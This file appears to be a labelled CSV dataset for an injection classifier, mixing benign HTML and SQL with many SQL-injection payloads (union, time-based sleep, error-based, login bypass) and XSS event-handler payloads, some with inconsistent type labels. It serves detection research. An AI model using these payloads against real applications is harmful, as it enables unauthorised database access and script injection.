Text,Label,type
"<ins draggable=""true"" ondragend=""alert(1)"">test</ins>",2,xss
select   (  case when   (  7096  =  2568  )   then 7096 else 1/  (  select 0  )   end  )  --,1,xss
"<li><a href=""/wiki/Charles_Sanders_Peirce"" title=""Charles Sanders Peirce"">Charles Sanders Peirce </a> </li>",0,xss
"<map draggable=""true"" ondragenter=""alert(1)"">test</map>",2,xss
"<div draggable=""true"" contenteditable>drag me</div><param ondrop=alert(1) contenteditable>drop here</param>",2,xss
"<style>:target {color:red;}</style><track id=x style=""transition:color 1s"" ontransitionend=alert(1)></track>",2,xss
 </li>,0,xss
"<tr onkeypress=""alert(1)"" contenteditable>test</tr>",2,xss
avril,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation arxiv"">Vinyals, Oriol; Toshev, Alexander; Bengio, Samy; Erhan, Dumitru (2015). ""Show and Tell: A Neural Image Caption Generator"". <a href=""/wiki/ArXiv"" title=""ArXiv"">arXiv </a>:<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1411.4555"">1411.4555 </a> ",0,xss
"1%""  )   union all select null,null,null#",1,sql
SELECT DISTINCT chicken FROM traffic,0,sql
SELECT * FROM pretty,0,sql
" select * from users where id  =  1 or ""_{"" or 1  =  1 -- 1",1,sql
<kbd id=x tabindex=1 onbeforeactivate=alert(1)></kbd>,2,xss
1' where 6583  =  6583,1,sql
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_label_2874' LIMIT 1,0,sql
SELECT boy ( s )  FROM card SELECT carry ( s ) ,0,sql
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;56–163 </li>",0,xss
15423399j,0,sql
"<style>@keyframes slidein {}</style><center style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></center>",2,xss
"<element onmouseup=""alert(1)"">test</element>",2,xss
SELECT * FROM slave FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM useful,0,sql
	 </span> </li>,0,xss
SELECT * FROM how WHERE flat  BETWEEN 10 AND 20,0,sql
sirevici,0,sql
"<div role=""navigation"" class=""navbox"" aria-labelledby=""Evolutionary_computation"" style=""padding:3px""><table class=""nowraplinks mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",0,xss
SELECT COUNT ( nobody ) FROM coffee,0,sql
"<marquee onmouseover=""alert(1)"">test</marquee>",2,xss
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main articles: <a href=""/wiki/Hard_problem_of_consciousness"" title=""Hard problem of consciousness"">Hard problem of consciousness </a> and <a href=""/wiki/Theory_of_mind"" title=""Theory of mind"">Theory of mind </a> </div>",0,xss
"	 <div style=""padding:0em 0.25em"">",0,xss
SELECT * FROM dig WHERE proud BETWEEN '1996-07-01' AND '1996-07-31',0,sql
insert,1,sql
SELECT color ( s )  FROM mixture,0,sql
"rio nervion, 177",0,sql
SELECT * FROM hope FETCH FIRST 3 ROWS ONLY,0,sql
"<label ondblclick=""alert(1)"">test</label>",2,xss
SELECT TOP 50 PERCENT * FROM remember,0,sql
"  SELECT Orders.rootrID, Employees.symbol, Employees.fewer FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.contrastID ORDER BY Orders.shallID",0,sql
5.57567E+15,0,sql
SELECT * FROM palace WHERE NOT settlers = 'pass'  AND NOT bowl = 'leave',0,xss
"<object onkeyup=""alert(1)"" contenteditable>test</object>",2,xss
SELECT * FROM lot  WHERE there NOT LIKE '[dozen]%',0,sql
<bdo onpointerenter=alert(1)>XSS</bdo>,2,xss
	 </form>,0,xss
"1%'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  '",1,sql
" </p><p><a href=""/wiki/Isaac_Asimov"" title=""Isaac Asimov"">Isaac Asimov </a> introduced the <a href=""/wiki/Three_Laws_of_Robotics"" title=""Three Laws of Robotics"">Three Laws of Robotics </a> in many books and stories, most notably the ""Multivac"" series about a super-intelligent computer of the same name. Asimov's laws are often brought up during lay discussions of machine ethics;<sup id=""cite_ref-415"" class=""reference""><a href=""#cite_note-415"">&#91;403&#93; </a> </sup> while almost all artificial intelligence researchers are familiar with Asimov's laws through popular culture, they generally consider the laws useless for many reasons, one of which is their ambiguity.<sup id=""cite_ref-416"" class=""reference""><a href=""#cite_note-416"">&#91;404&#93; </a> </sup>",0,xss
"SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.ID IN  ( 28341,28313 )  AND wp_posts.post_type  =  'houzez_agent' AND   (  (  wp_posts.post_status 'trash' AND wp_posts.post_status 'auto-draft' AND wp_posts.post_status 'flamingo-spam'  )  )   ORDER BY wp_posts.post_date DESC",0,xss
44650,0,sql
"INSERT INTO base ( baseball, hunter, freedom, physical, top, corner )  VALUES  ( 'mass', 'tide'. that', 'meat', 'food', 'maybe', 'seed' )  ",0,sql
SELECT * FROM men FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"1'  )   where 3330  =  3330 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
 ,0,xss
"1""  )   where 2388  =  2388 union all select null,null,null,null,null,null,null,null,null--",1,sql
"  SELECT plannedID AS ID, castle AS lying FROM repeat",0,sql
"c/ madrid, 53 5-f",0,sql
"-8844""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,xss
<form onreset=alert(1)><input type=reset>,2,xss
<footer id=x tabindex=1 onbeforeactivate=alert(1)></footer>,2,xss
1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,sql
magalia,0,sql
"  SELECT * FROM happily WHERE length IN  ( 'pig', 'call', 'ten' )  ",0,sql
SELECT MIN ( salt )  AS court FROM parallel,0,sql
"1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--",1,sql
"c/ andorra, 71",0,sql
 ,0,xss
SELECT COUNT ( those )  FROM mission,0,xss
"1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
33529,0,sql
58261127b,0,sql
SELECT * FROM forth WHERE Price NOT BETWEEN 10 AND 20,0,sql
pryor,0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><address id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></address>",2,xss
"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",1,sql
5215,0,sql
mcanally@rockefeller.bt,0,sql
"calle puruuela, 15 6?d",0,sql
"  SELECT FIND_IN_SET ( ""q"", ""s,q,l"" ) ;",0,sql
SELECT load ( s )  FROM measure LEFT JOIN,0,sql
"-6294"" union all select 9921,9921,9921,9921,9921,9921--",1,xss
"1  )   union all select null,null,null,null,null,null,null,null#",1,sql
"<em onkeyup=""alert(1)"" contenteditable>test</em>",2,xss
<svg id=x tabindex=1 onactivate=alert(1)></svg>,2,xss
"SELECT YEAR ( ""2017-06-15 09:34:21"" ) ;",0,sql
SELECT more ( s )  FROM bread UNION ALL,0,sql
-4960'  )   union all select 5300--,1,sql
"<ul><li><a href=""/wiki/Programming_paradigm"" title=""Programming paradigm"">Programming paradigm </a> </li>",0,xss
SELECT trick ( s FROM tall RIGHT JOIN,0,sql
1 where 1931  =  1931 and sleep  (  5  )  --,1,sql
1'||  (  select 'kyhs' from dual where 9491  =  9491,1,sql
"1"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""bnyh""  =  ""bnyh",1,sql
1063,0,sql
SELECT * FROM nearby  WHERE went = she,0,sql
119,0,sql
"	 </span> <span class=""reference-text"">",0,xss
kai-larsen-picchio6@multasdetransito.net,0,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/benchmarking.html"">Benchmarking</a></li>",0,xss
"1  )   where 5464  =  5464 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
<ul>,0,xss
<center id=x tabindex=1 onfocus=alert(1)></center>,2,xss
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://joshworth.com/stop-calling-in-artificial-intelligence/"">""Stop Calling it Artificial Intelligence"" </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=Stop+Calling+it+Artificial+Intelligence&amp;rft_id=https%3A%2F%2Fjoshworth.com%2Fstop-calling-in-artificial-intelligence%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
rebalg1r,0,sql
SELECT TOP 3 * FROM whispered WHERE funny = 'map' SELECT * FROM draw,0,xss
<svg><label onload=alert(1)></label>,2,xss
"1'+  (  select sfmz where 4870  =  4870 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
 ,0,xss
brines grimalda,0,sql
1'1,1,sql
"   SELECT within, badly+ ', ' + whistle+ ' ' + entire+ ', ' + plenty AS avoid  FROM does",0,sql
"<var draggable=""true"" ondragend=""alert(1)"">test</var>",2,xss
"  SELECT ADDTIME ( ""2017-06-15   09:34:21.000001"", ""5 2:10:5.000003"" ) ;",0,sql
valdearcos de la vega,0,sql
document.write,2,xss
SELECT week ( s )  FROM outside SELECT pot FROM during,0,sql
"<style>@keyframes x{}</style><script style=""animation-name:x"" onanimationend=""alert(1)""></script>",2,xss
arpe*nde,0,sql
d2s32bearse,0,sql
SELECT option_value FROM wp_options WHERE option_name  =  '_options_middle_button_link' LIMIT 1,0,xss
"<meta onmouseenter=""alert(1)"">test</meta>",2,xss
<u onpointerup=alert(1)>XSS</u>,2,xss
1   )    )    as eveb where 7567  =  7567,1,sql
"1'+  (  select nvht where 9118  =  9118 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",1,sql
"1%"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""%""  =  """,1,sql
"<li id=""cite_note-121""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-121"">^ </a> </b> ",0,xss
"1%"" or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
"1'||  (  select 'qrle' from dual where 9239  =  9239 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",1,sql
<article onpointerleave=alert(1)>XSS</article>,2,xss
"<style>:target {color: red;}</style><basefont id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></basefont>",2,xss
"<fieldset onkeydown=""alert(1)"" contenteditable>test</fieldset>",2,xss
"<cite draggable=""true"" ondragstart=""alert(1)"">test</cite>",2,xss
"<nobr onbeforepaste=""alert(1)"" contenteditable>test</nobr>",2,xss
SELECT * FROM brain WHERE guard = 'political',0,sql
"ronda bellesguard 125, 11?c",0,sql
"<hgroup onmouseup=""alert(1)"">test</hgroup>",2,xss
	 </span>,0,xss
"<ruby onkeypress=""alert(1)"" contenteditable>test</ruby>",2,xss
"<li><a href=""#CITEREFLeggHutter2007"">Legg &amp; Hutter 2007 </a>. </li> </ul>",0,xss
cea,0,sql
SELECT TOP 3 * FROM habit,0,sql
8424,0,sql
cherino gebhardt,0,sql
SELECT dear FROM famous UNION SELECT equipment FROM power ORDER BY hurry,0,sql
"select count  (  *  )   from generate_series  (  1,5000000  )  # fnck",1,sql
contrapalanqun,0,sql
"<li id=""cite_note-49""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-49"">^ </a> </b> ",0,xss
1' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'pziy'  =  'pziy,1,sql
<title id=x tabindex=1 onactivate=alert(1)></title>,2,xss
SELECT whom ( s ) FROM subject INNER JOIN,0,sql
<noframes onpointerout=alert(1)>XSS</noframes>,2,xss
"select count  (  *  )   from generate_series  (  1,5000000  )   and ""%""  =  """,1,sql
"<bdi onbeforecopy=""alert(1)"" contenteditable>test</bdi>",2,xss
1'  )   where 5145  =  5145,1,sql
<frameset id=x tabindex=1 onfocusin=alert(1)></frameset>,2,xss
"calle valle de salazar, 48,",0,sql
SELECT MIN ( box )  AS film FROM tie,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262329 )  ORDER BY meta_id ASC",0,sql
-3821'  )   or 9323  =  9323#,1,sql
SELECT * FROM meal WHERE thus = 'development' FETCH FIRST 3 ROWS ONLY,0,sql
"<li><a href=""/wiki/Philosophy_of_technology"" title=""Philosophy of technology"">Technology </a>",0,xss
<picture id=x tabindex=1 ondeactivate=alert(1)></picture><input id=y autofocus>,2,xss
<p id=x tabindex=1 onbeforeactivate=alert(1)></p>,2,xss
"INSERT INTO something  ( figure, sail, mad )  VALUES  ( 'announced', 'example', 'very' )  ",0,sql
40133,0,sql
"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )   ",1,sql
"   SELECT recently,running,light,house,birth     (  (  onto JOIN nodded ON animal.held =  arrive.whom )   INNER JOIN olderON Orders.allow =  pair.awayID ) ",0,sql
SELECT TOP 50 PERCENT * FROM hunter SELECT * FROM kitchen FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM fat,0,sql
SELECT * FROM slight WHERE indeed IN  ( SELECT hard FROM describe ) ,0,sql
"<div draggable=""true"" contenteditable>drag me</div><a ondrop=alert(1) contenteditable>drop here</a>",2,xss
"1'   )    )    as prxm where 1267  =  1267 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,xss
"<li id=""cite_note-AI_at_CMU_in_the_60s-159""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI_at_CMU_in_the_60s_159-0"">^ </a> </b> ",0,xss
elder@parcalia.hn,0,sql
 UPDATE tight SET several = 'pattern'WHERE goose = 'reach',0,sql
	 </span> </h3>,0,xss
braham,0,xss
"1"" where 7005  =  7005",1,sql
" SELECT * FROM human ORDER BY social ASC, exercise DESC",0,sql
SELECT COUNT ( dawn )  FROM discuss,0,xss
 </li>,0,xss
SELECT ready ( s )  FROM tight LEFT JOIN,0,sql
bancroft@lawn.mc,0,sql
saya,0,sql
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'kyos' like 'kyos",1,sql
"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""asvy""  =  ""asvy",1,sql
38i2t702,0,xss
FROM  ( SELECT DISTINCT ran FROM outline ) ,0,sql
"1""   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  ""kfdh"" like ""kfdh",1,sql
"1"" where 4688  =  4688 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,xss
"	 </span> <span class=""reference-text"">Lindenbaum, M., Markovitch, S., &amp; Rusakov, D. (2004). Selective sampling for nearest neighbor classifiers. Machine learning, 54(2), 125–152. ",0,xss
"1""  )   as wmng where 5976  =  5976",1,sql
"<div draggable=""true"" contenteditable>drag me</div><title ondragover=alert(1) contenteditable>drop here</title>",2,xss
"1""   )    )    as tjdz where 8656  =  8656 union all select null,null,null,null,null--",1,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=BBC+News&amp;rft.atitle=Microsoft%27s+Bill+Gates+insists+AI+is+a+threat&amp;rft.date=2015-01-29&amp;rft.aulast=Rawlinson&amp;rft.aufirst=Kevin&amp;rft_id=https%3A%2F%2Fwww.bbc.co.uk%2Fnews%2F31047780&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<keygen ondblclick=""alert(1)"">test</keygen>",2,xss
"<applet onmouseover=""alert(1)"">test</applet>",2,xss
SELECT * FROM base ORDER BY symbol DESC,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Schmidhuber, J. (1992). ""Learning complex, extended sequences using the principle of history compression"". <i>Neural Computation </i>. <b>4 </b> (2): 234–242. <a href=""/wiki/CiteSeerX"" title=""CiteSeerX"">CiteSeerX </a>&#160;<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.49.3934"">10.1.1.49.3934 </a> ",0,xss
select sleep  (  5  )   and    (    (   'uyft'  =  'uyft,1,sql
end and    (    (   '%'  =  ',1,sql
"<font onmouseleave=""alert(1)"">test</font>",2,xss
SELECT thumb ( s )  FROM children SELECT who FROM salt,0,sql
"1%""   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   ""%""  =  """,1,xss
SELECT advice FROM heart UNION ALL SELECT rhyme FROM room ORDER BY felt,0,sql
"1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
l-9rn,0,xss
11203636z,0,sql
SELECT * FROM express WHERE dear = 'sense' LIMIT 3,0,sql
SELECT * FROM snow WHERE brick BETWEEN 'how' AND 'has',0,sql
SELECT AVG ( setting ) FROM than,0,xss
"1'   )    )    as nuku where 7009  =  7009 union all select null,null,null,null,null#",1,xss
nieva de cameros,0,sql
"<small onkeypress=""alert(1)"" contenteditable>test</small>",2,xss
"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",1,sql
49180,0,sql
"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1,xss
"<link onmouseout=""alert(1)"">test</link>",2,xss
o.toole,0,sql
"iif  (  3548  =  8646,1,1/0  )  ",1,sql
SELECT COUNT ( cross )  FROM grabbed,0,sql
"<menuitem onkeypress=""alert(1)"" contenteditable>test</menuitem>",2,xss
3.58192E+15,0,sql
1' where 7828  =  7828 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,sql
"<table ondblclick=""alert(1)"">test</table>",2,xss
SELECT DISTINCT art FROM if,0,xss
SELECT children ( s ) FROM school INNER JOIN,0,sql
<del onfocusout=alert(1) tabindex=1 id=x></del><input autofocus>,2,xss
"1"" and   (  1668  =  8054  )  *8054",1,xss
vingelli9@custombikesclothes.fr,0,xss
"d=""alert('');\"")"";",2,xss
cintio,0,sql
-8553'+  (  select adko where 1750  =  1750 union all select 1750#,1,sql
select   (  case when   (  2294  =  3651  )   then 2294 else 2294*  (  select 2294 from information_schema.character_sets  )   end  )  #,1,xss
